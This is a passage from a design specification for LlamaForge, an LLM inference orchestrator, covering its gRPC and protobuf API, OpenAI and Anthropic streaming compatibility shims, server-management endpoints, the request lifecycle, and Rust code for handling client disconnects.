  repeated string capabilities = 4;  // "chat", "completion", "embedding", "rerank", "vision", "audio"
  string quantization_type = 5;      // e.g., "Q4_K_M", "Q8_0", "F16"
  repeated string loaded_lora_adapters = 6; // Resolved adapter names (filename stem or explicit `name` from config)
}

message ListModelsRequest {}

message ListModelsResponse {
  repeated ModelInfo models = 1;
}

// ============================================================
// Reranking
// ============================================================

message RerankRequest {
  RequestMetadata metadata = 1;
  string model = 2;
  string query = 3;
  repeated string documents = 4;
  optional uint32 top_n = 5;         // Return only the top N results (default: all)
}

message RerankResponse {
  repeated RerankResult results = 1;
  UsageStats usage = 2;
  RequestPerformanceMetrics metrics = 3;
}

message RerankResult {
  uint32 index = 1;                  // Index into the original documents array
  double relevance_score = 2;        // Relevance score (higher = more relevant)
  string document = 3;               // The document text (echoed back for convenience)
}

// ============================================================
// Queue Service
// ============================================================

service QueueService {
  rpc GetQueueStatus(GetQueueStatusRequest) returns (QueueStatusResponse);
  rpc CancelRequest(CancelRequestRequest) returns (CancelRequestResponse);
  rpc BoostPriority(BoostPriorityRequest) returns (BoostPriorityResponse);
  // Server-side streaming: pushes queue state changes in real time
  rpc WatchQueue(WatchQueueRequest) returns (stream QueueEvent);
}

message GetQueueStatusRequest {}

message QueueStatusResponse {
  uint32 total_queued = 1;
  map<string, uint32> by_priority_level = 2;
  double oldest_request_age_secs = 3;
  double estimated_drain_time_secs = 4;
  repeated QueuedRequestInfo requests = 5;
}

message QueuedRequestInfo {
  string request_id = 1;
  TaskType task_type = 2;
  string requestor = 3;
  uint32 effective_priority = 4;
  uint32 queue_position = 5;
  double wait_time_secs = 6;
  string model = 7;
}

message CancelRequestRequest { string request_id = 1; }
message CancelRequestResponse { bool success = 1; string message = 2; }

message BoostPriorityRequest {
  string request_id = 1;
  uint32 new_priority = 2;
}
message BoostPriorityResponse { bool success = 1; uint32 effective_priority = 2; }

message WatchQueueRequest {
  optional string filter_model = 1;
  optional string filter_requestor = 2;
}
message QueueEvent {
  google.protobuf.Timestamp timestamp = 1;
  string event_type = 2;  // "enqueued", "dispatched", "evicted", "completed", "cancelled"
  QueuedRequestInfo request = 3;
}

// ============================================================
// Server Management Service
// ============================================================

service ServerMgmtService {
  rpc ListServers(ListServersRequest) returns (ListServersResponse);
  rpc GetServer(GetServerRequest) returns (ServerDetail);
  // Server creation and deletion are driven by TOML config + reload (no AddServer/RemoveServer RPCs).
  // Runtime LoRA adapter mutations are handled via the REST management API with
  // Config Writeback to TOML — see Section 5.5.
  rpc StartServer(StartServerRequest) returns (ServerDetail);
  rpc StopServer(StopServerRequest) returns (ServerDetail);
  rpc RestartServer(RestartServerRequest) returns (ServerDetail);
  rpc ListModels(ListModelsRequest) returns (ListModelsResponse);
  rpc GetSlots(GetSlotsRequest) returns (GetSlotsResponse);
}

// (Message definitions for server management follow standard CRUD patterns;
//  see full .proto file in the repository for complete definitions.)

// ============================================================
// Metrics Service
// ============================================================

service MetricsService {
  rpc QueryRequestMetrics(QueryRequestMetricsRequest) returns (QueryRequestMetricsResponse);
  rpc GetAggregatedMetrics(GetAggregatedMetricsRequest) returns (AggregatedMetricsResponse);
  // Server-side streaming: pushes metric snapshots at a configurable interval
  rpc WatchMetrics(WatchMetricsRequest) returns (stream MetricsSnapshot);
}

message QueryRequestMetricsRequest {
  optional string model = 1;
  optional TaskType task_type = 2;
  optional string requestor = 3;
  optional google.protobuf.Timestamp start_time = 4;
  optional google.protobuf.Timestamp end_time = 5;
  uint32 limit = 6;
  uint32 offset = 7;
}

message QueryRequestMetricsResponse {
  repeated RequestPerformanceMetrics metrics = 1;
  uint32 total_count = 2;
}

message WatchMetricsRequest {
  google.protobuf.Duration interval = 1;  // How often to push snapshots
}

message MetricsSnapshot {
  google.protobuf.Timestamp timestamp = 1;
  double throughput_tps = 2;
  double goodput_tps = 3;
  uint32 queue_depth = 4;
  double error_rate = 5;
  map<string, double> ttft_percentiles = 6;  // "p50", "p95", "p99"
  repeated ServerMetricsSnapshot servers = 7;
}

message ServerMetricsSnapshot {
  string server_id = 1;
  optional double kv_cache_usage = 2;  // Absent for recurrent model servers (not applicable, vs. 0.0 = empty)
  uint32 active_slots = 3;
  uint32 total_slots = 4;
  double generation_tps = 5;
}
```

> **Protobuf `oneof` Evolution Rules:**
>
> 1. **Augmenting existing phases:** New data that enriches an existing stream phase MUST be added as optional fields inside the existing message. For example, streaming logprob data in v1.1 will be added as `optional TokenLogprob logprob = 8` inside `TokenChunk` (reusing the `TokenLogprob` message already defined for `CompletionChoice.logprobs`), not as a new `oneof response_type` variant. Adding a new variant for augmentation data would cause v1 clients (without a wildcard handler) to silently drop the message, losing tokens mid-stream.
>
> 2. **New lifecycle phases:** New `oneof` variants ARE permitted for genuinely new stream phases that represent a distinct lifecycle event (e.g., `SpeculativeDraftNotice` in v2, `PrefillProgressUpdate`). A v1 client receiving an unknown variant safely skips it — no data loss occurs because the new phase carries auxiliary information, not token content.
>
> 3. **Mandatory wildcard match arms:** All generated client stubs (and the Rust server) MUST implement a `_ => {}` wildcard match arm (Rust) or `default:` case (other languages) that logs and skips unknown `oneof` variants. This is a **hard requirement** — code review must reject any `match` on a `oneof` that lacks a wildcard. This ensures that v1 clients compiled against the v1 proto safely handle v2 variants without crashing, even if they don't understand the new message type.
>
>    ```rust
>    // REQUIRED pattern for all oneof match sites:
>    match response.response_type {
>        Some(ResponseType::QueueUpdate(u)) => { /* ... */ }
>        Some(ResponseType::EvictionNotice(e)) => { /* ... */ }
>        Some(ResponseType::Chunk(c)) => { /* ... */ }
>        Some(ResponseType::Summary(s)) => { /* ... */ }
>        Some(_) => {
>            // Unknown variant from a newer server version — log and skip.
>            tracing::debug!("skipping unknown response variant");
>        }
>        None => { /* Empty oneof — skip */ }
>    }
>    ```
>
> The combination of rules 1-3 means: the protocol design does not *rely* on wildcard arms for correctness of existing functionality, but wildcard arms are still mandatory as a defense-in-depth measure for forward compatibility with new lifecycle phases.

### 7.1 gRPC Streaming: Chat Completion (Primary API)

**Client call (Python example using generated stubs):**

```python
import grpc
from llamaforge.v1 import inference_pb2, inference_pb2_grpc, common_pb2

channel = grpc.insecure_channel("localhost:50051")
stub = inference_pb2_grpc.InferenceServiceStub(channel)

request = inference_pb2.ChatCompletionRequest(
    metadata=common_pb2.RequestMetadata(
        task_type=common_pb2.TASK_TYPE_REALTIME_CHAT,
        requestor="interactive-ui",
    ),
    model="llama-3.1-8b",
    messages=[
        common_pb2.ChatMessage(role="system", content="You are a helpful assistant."),
        common_pb2.ChatMessage(role="user", content="Explain KV cache quantization."),
    ],
    max_tokens=512,
    temperature=0.7,
    stream=True,
)

# Server-side streaming — iterate over responses
for response in stub.ChatCompletion(request, timeout=300):
    if response.HasField("queue_update"):
        print(f"Queue position: {response.queue_update.position}")
    elif response.HasField("eviction_notice"):
        print(f"Evicted! Reason: {response.eviction_notice.reason}")
    elif response.HasField("chunk"):
        print(response.chunk.content, end="", flush=True)
        if response.chunk.HasField("ttft_ms"):
            print(f"\n[TTFT: {response.chunk.ttft_ms:.1f}ms]")
    elif response.HasField("summary"):
        m = response.summary.metrics
        print(f"\n--- Done: {m.generation_tps:.1f} t/s, "
              f"TTFT {m.ttft_ms:.1f}ms, "
              f"total {m.total_latency_ms:.1f}ms ---")
```

**Stream message sequence:**

```
┌──────────────────────────────────────────────────────────────────┐
│ gRPC Stream: InferenceService.ChatCompletion                      │
│                                                                    │
│  Message 1:  queue_update { position: 3, estimated_wait: 12.5 }  │
│  Message 2:  queue_update { position: 1, estimated_wait: 3.0 }   │
│  Message 3:  chunk { content: "The", ttft_ms: 142.7 }            │
│  Message 4:  chunk { content: " KV" }                             │
│  Message 5:  chunk { content: " cache" }                          │
│  ...                                                               │
│  Message N:  chunk { content: ".", finish_reason: STOP }          │
│  Message N+1: summary { usage: {...}, metrics: {...} }            │
│                                                                    │
│  Stream closes.                                                    │
└──────────────────────────────────────────────────────────────────┘
```

Key design points:

- **`oneof response_type`** in the protobuf means the client handles each message variant with a simple pattern match. No string-parsing SSE `event:` tags.
- **TTFT** is attached to the first `TokenChunk` message. The client can extract it immediately.
- **Summary** is always the final message, carrying full `UsageStats` and `RequestPerformanceMetrics`.
- **Eviction notice** is a first-class message type in the protobuf schema, included for forward compatibility with v2 preemptive eviction (Section 9.3). In v1 (queue-only preemption), `EvictionNotice` is never sent during normal operation — it exists so that v2 clients compiled against the v1 proto already handle the message variant. The only v1 scenario where a client sees disruption is a backend crash or shutdown: dispatched requests (prefilling or generating) receive a gRPC `UNAVAILABLE` status with `FINISH_REASON_UPSTREAM_FAILURE` and should be retried immediately by the client (the request was valid — the failure is cluster-side); queued requests (no active HTTP connection) are transparently re-routed to other servers.
- **Deadline propagation:** The client's gRPC deadline (or `queue_timeout` in metadata) is respected server-side. If the deadline expires while queued, the server sends a gRPC `DEADLINE_EXCEEDED` status and logs the timeout event.

### 7.2 OpenAI HTTP Shim (Backward Compatibility)

The HTTP shim translates between OpenAI JSON format and the internal gRPC types. Clients using OpenAI SDKs see standard responses with the `llamaforge` extension key:

**`POST /v1/chat/completions`**

Request (unchanged from OpenAI format):
```json
{
  "model": "llama-3.1-8b",
  "messages": [
    {"role": "system", "content": "You are a helpful assistant."},
    {"role": "user", "content": "Explain KV cache quantization."}
  ],
  "max_tokens": 512,
  "temperature": 0.7,
  "stream": true,
  "metadata": {
    "task_type": "realtime_chat",
    "requestor": "interactive-ui"
  }
}
```

Response (streaming SSE — translated from gRPC stream):
```
data: {"id":"01J5ABCDEF...","object":"chat.completion.chunk","choices":[{"delta":{},"index":0}],"llamaforge":{"status":"queued","queue_position":3,"estimated_wait_secs":12.5}}

data: {"id":"01J5ABCDEF...","object":"chat.completion.chunk","choices":[{"delta":{},"index":0}],"llamaforge":{"status":"queued","queue_position":1,"estimated_wait_secs":3.0}}

data: {"id":"01J5ABCDEF...","object":"chat.completion.chunk","choices":[{"delta":{},"index":0}],"llamaforge":{"status":"processing","server_id":"srv-01","slot_id":2,"queue_wait_ms":15.3}}

data: {"id":"01J5ABCDEF...","object":"chat.completion.chunk","choices":[{"delta":{"role":"assistant"},"index":0}],"llamaforge":{"ttft_ms":142.7}}

data: {"id":"01J5ABCDEF...","object":"chat.completion.chunk","choices":[{"delta":{"content":"The"},"index":0}]}

... (more chunks)

data: {"id":"01J5ABCDEF...","object":"chat.completion.chunk","choices":[{"delta":{},"index":0,"finish_reason":"stop"}],"llamaforge":{"generation_tps":68.4,"total_latency_ms":4714.2}}

data: {"id":"01J5ABCDEF...","object":"chat.completion.chunk","choices":[],"usage":{"prompt_tokens":24,"completion_tokens":312,"total_tokens":336}}

data: [DONE]
```

> **`llamaforge` extension stability:** The `llamaforge` extension key is **unstable** in v1.x and may change between minor versions. Clients should not rely on specific field names or structure for programmatic logic. Use the gRPC API for stable programmatic access to queue status and metrics. The extension is intended as an operational debugging aid, not a programmatic interface. If demand warrants, a stable `llamaforge` extension schema will be versioned and committed in a future release.
>
> **`server_id` and `slot_id` coupling note:** The `server_id` (a user-defined config string like `llama-8b-gpu0`) and `slot_id` (an internal integer) in the extension are operational aids for debugging — they reveal which server handled a request. These reflect the internal configuration and may change if the operator renames servers or adjusts slot counts. Do not use for client-side routing logic or monitoring dashboards that break on server rename. For stable server identity, use the request's `request_id` to correlate with the audit log.

**Mid-stream error format (OpenAI SSE):** If a request is cancelled mid-stream (backend shutdown, client backpressure timeout, unary execution timeout), LlamaForge must emit a structured terminal chunk that OpenAI SDK parsers can process without crashing. Raw JSON error objects injected mid-stream (e.g., `data: {"error": "backend_shutdown"}`) break the OpenAI Python SDK's `ChatCompletionChunk` parser because the object lacks the required `choices` array and `object` field.

The terminal error chunk uses the standard `chat.completion.chunk` schema with `finish_reason` set to a recognized value and the error details in the `llamaforge` extension field:

```
data: {"id":"01J5ABCDEF...","object":"chat.completion.chunk","choices":[{"delta":{},"index":0,"finish_reason":"stop"}],"llamaforge":{"error":"backend_shutdown","error_phase":"generating","tokens_generated":47,"request_id":"01J5ABCDEF..."}}

data: [DONE]
```

Design decisions for this format:

- **`finish_reason` is `"stop"`, not a custom value.** The OpenAI specification defines a closed enum for `finish_reason`: `"stop"`, `"length"`, `"tool_calls"`, `"content_filter"`, `"function_call"`. Custom values like `"error"` or `"cancelled"` cause SDK parsers to throw validation errors or silently coerce to `None`, depending on the SDK version. Using `"stop"` ensures all SDK parsers accept the chunk. The `llamaforge.error` field conveys the actual cancellation reason to LlamaForge-aware clients.
- **The `data: [DONE]` sentinel MUST follow.** Without it, SSE clients wait indefinitely for the next event. The OpenAI SDK specifically uses `[DONE]` to close its async iterator.
- **For gRPC:** The `TokenChunk` message already has `optional FinishReason finish_reason = 3`, which includes `FINISH_REASON_CLIENT_DISCONNECT` and `FINISH_REASON_UPSTREAM_FAILURE`. gRPC clients receive the precise finish reason — no format workaround needed. This enables programmatic retry logic: `UPSTREAM_FAILURE` → retry immediately (cluster-side issue), `CLIENT_DISCONNECT` → retry only if still interested (client-side issue).
- **For the Anthropic endpoint:** The error is emitted as `event: message_delta` with `"stop_reason": "end_turn"` and the `llamaforge.error` extension in the `data:` payload, followed by `event: message_stop`. The Anthropic SDK's state machine requires `message_delta` before `message_stop`; skipping either causes `ProtocolError`.

> **Compatibility Note — SSE Event Format is Endpoint-Dependent.**
> The **OpenAI endpoints** (`/v1/chat/completions`, `/v1/completions`) use only `data:` lines — no `event:` field is ever emitted. This is required for compatibility with the OpenAI Python SDK (and other OpenAI-compatible clients), which only parse `data:` lines and silently ignore or break on named SSE events. Queue position updates and processing status are conveyed as empty-delta chunks carrying the `llamaforge` metadata key. Clients that do not understand the `llamaforge` key simply see harmless empty-delta chunks.
>
> The **Anthropic endpoint** (`/v1/messages`) uses named `event:` fields (`message_start`, `content_block_start`, `content_block_delta`, `content_block_stop`, `message_delta`, `message_stop`) as required by the Anthropic Python/TypeScript SDKs — their parsers structurally depend on these event types to identify message boundaries and enforce a strict forward-only state machine. The "no named events" rule applies only to the OpenAI path. Keepalives on the Anthropic path are sent as **`event: ping`** with a data payload conforming to the Anthropic SDK's strict schema: `data: {"type": "ping"}`. The Anthropic Python and TypeScript SDKs validate the `data` payload of `event: ping` against a strict schema requiring `{"type": "ping"}` as the top-level structure — any additional fields or a different top-level structure causes `ValidationError`. Queue position metadata is conveyed separately via **SSE comments** (`\n: llamaforge:queue_position=3\n: llamaforge:estimated_wait_secs=12.5\n`) which all SSE clients safely ignore per the WHATWG spec. The Anthropic specification explicitly defines `ping` as a no-op event that can appear at any point in the stream and must be silently ignored by compliant parsers — it is the only event type safe to emit before the `message_start` event that initializes the state machine. Sending any state-bearing event (e.g., `message_delta`, `content_block_delta`) before `message_start` causes the SDK parser to throw `ProtocolError` and drop the connection.
>
> The gRPC stream is not subject to either constraint — `ChatCompletionResponse.oneof response_type` continues to use distinct `QueueUpdate`, `EvictionNotice`, `TokenChunk`, and `CompletionSummary` message types freely.
>
> **[G-11] Anthropic SSE preamble race prevention:** The Anthropic shim MUST emit `event: message_start` and `event: content_block_start` **synchronously** (before entering the token-forwarding `select!` loop), regardless of how fast the first token arrives. These preamble events are emitted from pre-computed templates immediately after dispatch — they do not depend on any backend response. This prevents the race where a cached prompt produces TTFT < 1ms and the first `content_block_delta` arrives before the structural preamble. The implementation: (1) yield `message_start` with pre-filled metadata (model, usage estimate, id), (2) yield `content_block_start` with index 0 and type "text", (3) THEN enter the streaming loop. The Anthropic SDK's strict forward-only state machine throws `ProtocolError` if any `content_block_delta` precedes its `content_block_start`.

Response (non-streaming):
```json
{
  "id": "01J5ABCDEF...",
  "object": "chat.completion",
  "created": 1714100000,
  "model": "llama-3.1-8b",
  "choices": [{
    "index": 0,
    "message": {"role": "assistant", "content": "..."},
    "finish_reason": "stop"
  }],
  "usage": {
    "prompt_tokens": 24,
    "completion_tokens": 312,
    "total_tokens": 336
  },
  "llamaforge": {
    "request_id": "01J5ABCDEF...",
    "server_id": "llama-8b-gpu0",
    "slot_id": 2,
    "queue_wait_ms": 15.3,
    "ttft_ms": 142.7,
    "generation_tps": 68.4,
    "prompt_tps": 2847.3,
    "total_latency_ms": 4714.2,
    "was_evicted": false,
    "eviction_count": 0
  }
}
```

**Translation rules:**

| OpenAI JSON | gRPC Protobuf | Notes |
|-------------|---------------|-------|
| `metadata.request_id` or `X-Request-ID` header | `RequestMetadata.request_id` | Auto-generated if absent |
| `metadata.task_type` or `X-Task-Type` header | `RequestMetadata.task_type` (enum) | String mapped to enum |
| `metadata.requestor` or `X-Requestor` header | `RequestMetadata.requestor` | Passed through |
| `metadata.priority` or `X-Priority` header | `RequestMetadata.priority` | Passed through |
| `stream: true` + SSE | Server-side streaming RPC | SSE `data:` ↔ `TokenChunk` |
| `stream: false` + JSON body | Unary-style (collect stream internally) | `CompletionSummary.choices[0].content` |

> **Parameter Coercion Note:** The OpenAI specification allows `stop` to be either a string (`"stop": "\n"`) or an array of strings (`"stop": ["\n", "END"]`). The protobuf definition uses `repeated string stop`, which maps to a JSON array. The HTTP shim's custom JSON deserializer must coerce a bare string into a single-element array before passing to the protobuf layer. Without this, `serde`'s default deserialization will reject `{"stop": "\n"}` with an HTTP 400, breaking compatibility with clients that rely on the string shorthand.

> **`logit_bias` Key Coercion:** The protobuf definition uses `map<int32, float> logit_bias` (signed — `llama_token` is `int32_t` and negative values are used for control tokens like BOS/EOS). The OpenAI JSON specification uses string keys (e.g., `{"50256": -100}` or `{"-1": -100}` for control tokens). Standard protobuf JSON mapping will reject string-keyed maps. The HTTP shim must coerce string keys to `i32` during deserialization using `parse::<i32>()` — NOT `parse::<u32>()`, which would silently drop negative token IDs (control tokens). Non-numeric keys are rejected with HTTP 400.

> **OpenAI `null` Semantics:** The OpenAI specification permits JSON `null` for several optional fields to indicate "use the server default" or "unlimited". For example, `"max_tokens": null` means "generate until the model emits a stop token or hits the context limit" — it is semantically distinct from omitting the field entirely (which some SDKs treat differently). Because these fields are defined as `optional uint32` (or `optional double`, `optional string`) in the protobuf schema, JSON `null` must map to `None` (field absent on the wire).
>
> The default `serde` JSON deserializer for Rust rejects `null` for `Option<u32>` unless explicitly configured. The HTTP shim MUST use `#[serde(default, deserialize_with = "deserialize_null_as_none")]` (or a custom deserializer) on all optional numeric/string fields that the OpenAI spec permits as `null`:
>
> ```rust
> fn deserialize_null_as_none<'de, D, T>(deserializer: D) -> Result<Option<T>, D::Error>
> where
>     D: serde::Deserializer<'de>,
>     T: serde::Deserialize<'de>,
> {
>     // Accepts: absent (via #[serde(default)]), null, or T.
>     // Rejects: wrong type (e.g., "max_tokens": "abc").
>     Option::<T>::deserialize(deserializer)
> }
> ```
>
> Affected fields in `ChatCompletionRequest`: `max_tokens`, `temperature`, `top_p`, `frequency_penalty`, `presence_penalty`, `stop` (null → empty array), `user`. Without this, OpenAI Python SDK calls that explicitly pass `max_tokens=None` receive HTTP 400 from LlamaForge — a compatibility-breaking divergence that is difficult to debug because the SDK emits `null` silently.

### 7.3 Queue Status

**`GET /api/queue`**

```json
{
  "total_queued": 7,
  "by_priority_level": {
    "emergency": 0,
    "realtime_chat": 2,
    "code_review": 3,
    "background": 2
  },
  "oldest_request_age_secs": 45.2,
  "estimated_drain_time_secs": 120.0,
  "requests": [
    {
      "request_id": "01J5ABCD01...",
      "task_type": "realtime_chat",
      "requestor": "interactive-ui",
      "effective_priority": 850,
      "queue_position": 1,
      "wait_time_secs": 2.1,
      "model": "llama-3.1-8b"
    }
  ]
}
```

### 7.4 Server Management

**`POST /api/servers`** — Create a new server instance:

```json
{
  "server_id": "llama-70b-gpu01",
  "model_path": "/models/llama-3.1-70B-Q4_K_M.gguf",
  "alias": "llama-3.1-70b",
  "port": 8084,
  "gpu_layers": 99,
  "parallel_slots": 2,
  "ctx_size": 4096,
  "batch_size": 2048,
  "ubatch_size": 512,
  "cache_type_k": "q8_0",
  "cache_type_v": "q8_0",
  "flash_attn": "auto",
  "backend": "cuda",
  "devices": ["gpu:0", "gpu:1"],
  "model_architecture": "transformer",
  "auto_start": true
}
```

**`GET /api/servers/{id}`** — Server status with live metrics:

```json
{
  "server_id": "llama-8b-gpu0",
  "status": "running",
  "pid": 12345,
  "uptime_secs": 3600,
  "model": {
    "path": "/models/llama-3.1-8B-Q4_K_M.gguf",
    "alias": "llama-3.1-8b"
  },
  "config": {
    "parallel_slots": 4,
    "ctx_size": 8192,
    "cache_type_k": "q8_0",
    "cache_type_v": "q8_0"
  },
  "slots": [
    {"id": 0, "is_processing": true, "n_decoded": 142},
    {"id": 1, "is_processing": false},
    {"id": 2, "is_processing": true, "n_decoded": 7},
    {"id": 3, "is_processing": false}
  ],
  "metrics": {
    "kv_cache_usage_ratio": 0.42,
    "requests_processing": 2,
    "requests_deferred": 0,
    "prompt_tokens_per_sec": 2847.3,
    "generation_tokens_per_sec": 68.4,
    "total_requests_served": 15234
  }
}
```

**`POST /api/servers/{id}/slots/{slot_id}/erase`** — Manual slot erasure (SRE escape hatch):

Forcibly erases a stuck slot on a specific `llama-server` instance. This is a last-resort operational tool for when automated erase flows fail — e.g., a slot permanently stuck in `is_processing: true` due to a `llama-server` state machine corruption (the HTTP server is responsive but the slot's internal state is irrecoverably detached).

```json
// Request: POST /api/servers/llama-8b-gpu0/slots/2/erase
// No body required.

// Response (200 OK):
{
  "server_id": "llama-8b-gpu0",
  "slot_id": 2,
  "result": "erased",
  "previous_state": "is_processing: true, n_decoded: 142",
  "note": "Slot erase command forwarded to llama-server. Slot will appear idle on next /slots poll."
}

// Response (502 Bad Gateway — llama-server rejected the erase):
{
  "server_id": "llama-8b-gpu0",
  "slot_id": 2,
  "result": "failed",
  "error": "llama-server returned HTTP 404: slot_id 2 not found"
}
```

The handler issues `POST http://localhost:{port}/slots/{slot_id}?action=erase` directly to the target `llama-server`. If the erase succeeds (HTTP 200), it also clears any `cooldown` state for that slot in the scheduler, removes the corresponding entry from the `DispatchTracker` (if present), and logs a `server.manual_slot_erase` audit event. If the erase fails, the raw `llama-server` error is returned to the operator for diagnosis.

> **Web UI integration:** The Server Dashboard (Section 5.5) displays each slot's state. Stuck slots (is_processing == true for > 60 seconds without `n_decoded` progress) are highlighted in red with an "Erase Slot" button that calls this endpoint via htmx.

---

## 8. Request Lifecycle

A request flows through the following stages. Every transition is logged as an event.

```
Client sends POST /v1/chat/completions
         │
         ▼
    ┌─────────┐
    │ RECEIVE  │  Generate request_id (UUIDv7)
    │          │  Parse metadata (headers or body)
    │          │  Validate payload
    └────┬─────┘
         │
         ▼
    ┌─────────┐
    │ ADMIT    │  Check queue depth limits
    │          │  Check per-requestor limits
    │          │  Reject with 429 if over limit
    └────┬─────┘
         │
         ▼
    ┌─────────┐
    │ ENQUEUE  │  Compute effective_priority
    │          │  Insert into priority bucket queue
    │          │  Return queue position to client
    └────┬─────┘
         │
         ▼
    ┌─────────┐
    │ SCHEDULE │  Pop highest-priority request from queue.
    │          │  If a slot is available, dispatch immediately.
    │          │  If no slot available, request waits in queue
    │          │  (v1: no in-flight eviction — see Section 9.2).
    │          │  v2 adds prefill-only eviction (Section 9.3).
    └────┬─────┘
         │
         ▼
    ┌─────────┐
    │ DISPATCH │  Select target server (model affinity + load)
    │          │  Forward request to llama-server
    │          │  Record dispatched_at timestamp
    └────┬─────┘
         │
         ▼
    ┌─────────┐
    │ STREAM   │  Proxy SSE tokens back to client
    │          │  Record first_token_at on first delta
    │          │  Count completion tokens
    └────┬─────┘
         │
         ▼
    ┌─────────┐
    │ COMPLETE │  Record completed_at timestamp
    │          │  Compute all derived metrics
    │          │  Write RequestMetrics to SQLite
    │          │  Update Prometheus counters
    │          │  Release slot in scheduler's view
    └─────────┘
```

**Timing Diagram:**

```
t0 ─── request received ──────────────────────────────────► total_latency_ms
t0 ─── queue wait ──► t1 ── dispatch ──► t2 ── first token ──► ... ──► tN
       └─queue_wait_ms─┘     └── ttft_ms ─┘     └── generation_duration_ms ──┘
                              (from dispatch)

TTFT = t2 - t1  (time from dispatch to first generated token)
Generation TPS = completion_tokens / (tN - t2)
Prompt TPS = prompt_tokens / (t2 - t1 - overhead)  [approximated]
Total Latency = tN - t0
Queue Wait = t1 - t0
```

**Client Disconnect Handling:**

If a client drops their TCP connection mid-stream (or reads too slowly, saturating the bounded response channel), LlamaForge must immediately reclaim the upstream `llama-server` slot:

1. **Detection:** The proxy task detects disconnects through two mechanisms:
   - **Cooperative detection (primary):** The proxy task uses `tokio::select!` to race the upstream token stream against a client-liveness signal. On gRPC, tonic's `CancellationToken` fires when the HTTP/2 stream is reset. On HTTP/SSE, axum exposes connection closure via the request's `CancellationToken` or the response body sender returning `Err(Closed)`. When the liveness signal fires, the proxy task exits its streaming loop **cooperatively** (not via `Drop`) and proceeds to the cancellation cleanup path, which is fully async.
   - **Drop fallback (safety net):** If the cooperative path fails to detect the disconnect (e.g., the Tokio task is cancelled externally), the proxy task's `Drop` implementation fires. Because `Drop` is synchronous in Rust, it **cannot** `.await` the bounded audit channel. The `Drop` impl instead synchronously sends a lightweight `CancellationRecord` to the audit pipeline via a **bounded `tokio::sync::mpsc` channel with `try_send()`**.

   > **The `Drop` vs. `.await` solution:** `tokio::sync::mpsc::Sender::try_send()` is a **synchronous** method — it does not require `.await` and is safe to call from inside a `Drop` implementation. The `DispatchToken` RAII guard handles slot release via its own `Drop` impl (a synchronous `Option::take()` + `DashSet::remove` with `is_some()` guard + conditional `AtomicU32::fetch_sub` — no async needed, no double-decrement risk).
   >
   > **Why not unbounded?** An earlier design used `tokio::sync::mpsc::unbounded_channel()` for cancellation records. This creates an OOM vulnerability: if the downstream bounded audit channel is full (e.g., SQLite disk stall), the cancellation forwarder task blocks on `audit_tx.send().await`. Meanwhile, client disconnects continue pumping `CancellationRecord`s into the unbounded channel with no backpressure. Under sustained disk failure, memory grows without bound until the orchestrator is OOM-killed — dropping the entire priority queue. Bounded systems must never bridge to unbounded queues under backpressure.
   >
   > The cancellation channel is a **bounded** `tokio::sync::mpsc::channel(10_000)` created at startup. The `Drop` impl uses `try_send()`, which returns immediately with `Err(TrySendError::Full)` if the channel is at capacity. A dropped cancellation record increments `llamaforge_cancellations_dropped_total` — losing a cancellation telemetry record under catastrophic disk failure is strictly preferable to an OOM crash:
   >
   > ```rust
   > // At startup:
   > let (cancel_tx, mut cancel_rx) = tokio::sync::mpsc::channel::<CancellationRecord>(10_000);
   >
   > // Cancellation forwarder task — reads bounded channel, writes to bounded audit channel.
   > // CRITICAL: Uses send_timeout to prevent blocking when audit channel is full.
   > // Without timeout, a SQLite writer stall fills the audit channel (1000), the forwarder
   > // blocks indefinitely, the cancel channel fills (10k), all Drop impls start dropping
   > // records, and DispatchTracker retains phantom entries (inflating pending_dispatches).
   > tokio::spawn(async move {
   >     while let Some(record) = cancel_rx.recv().await {
   >         let metrics = RequestMetrics::from_cancellation(record);
   >         match tokio::time::timeout(
   >             Duration::from_secs(5),
   >             audit_tx.send(AuditEvent::RequestCancelled(metrics))
   >         ).await {
   >             Ok(Ok(())) => {} // successfully forwarded
   >             Ok(Err(_)) => {
   >                 tracing::warn!("audit channel closed, dropping cancellation record");
   >             }
   >             Err(_timeout) => {
   >                 // Audit channel full for 5s — drop record, unblock forwarder.
   >                 CANCELLATIONS_DROPPED.inc();
   >             }
   >         }
   >     }
   > });
   >
   > // In the proxy stream's Drop impl:
   > impl Drop for ProxyStreamGuard {
   >     fn drop(&mut self) {
   >         let record = CancellationRecord {
   >             request_id: self.request_id,
   >             tokens_generated: self.tokens_so_far,
   >             server_id: self.server_id.clone(),
   >         };
   >         match self.cancel_tx.try_send(record) {
   >             Ok(()) => {},
   >             Err(tokio::sync::mpsc::error::TrySendError::Full(_)) => {
   >                 // Channel full — system is under catastrophic backpressure.
   >                 // Losing a cancellation record is better than OOM.
   >                 CANCELLATIONS_DROPPED.inc();
   >             }
   >             Err(tokio::sync::mpsc::error::TrySendError::Closed(_)) => {
   >                 // Shutdown in progress — expected during graceful drain.
   >             }
   >         }
   >     }
   > }
   > ```
   >
   > This is strictly simpler and more correct than using `std::sync::mpsc` with `spawn_blocking` (which would permanently park a Tokio blocking thread and require `Arc<Mutex<Receiver>>` since `std::sync::mpsc::Receiver` is not `Clone`).

2. **Upstream cancellation with slot cooldown:** LlamaForge drops the `reqwest::Response` handle to the downstream `llama-server`, closing the HTTP connection. However, during a long prefill, `llama-server` blocks on the GPU and may not detect the closed socket immediately. To prevent routing a new request to a slot that is still physically occupied:
   - LlamaForge marks the slot as `cooldown` in the scheduler (not `available`).
   - **Slot correlation via `id_slot`:** LlamaForge uses the `id_slot` parameter (set in the `/completion` request) as the **primary correlation key** between dispatched requests and llama-server slots. When the routing algorithm assigns a request to a server, it selects a target slot (either a specific slot for cache affinity or `-1` for auto-assignment). LlamaForge maintains an in-memory **`slot_dispatch_map`** (`HashMap<(ServerId, SlotId), RequestId>`) that records which LlamaForge request is occupying which slot on which server.
     - **When `id_slot` is explicitly set** (cache-warm pinning): The slot is known at dispatch time. The map is populated immediately and the erase command targets the known slot directly on cancellation.
     - **When `id_slot = -1`** (auto-assignment): The assigned slot is discovered from the first SSE chunk or HTTP response headers (`slot_id` field in llama-server's response). If the client disconnects during the prefill phase before any chunks are received, the proxy task does not yet know the assigned slot. In this case, LlamaForge falls back to polling `GET /slots` and correlating the orphaned slot by matching the `id_task` value observed in the `/slots` response against the known set of in-flight requests.
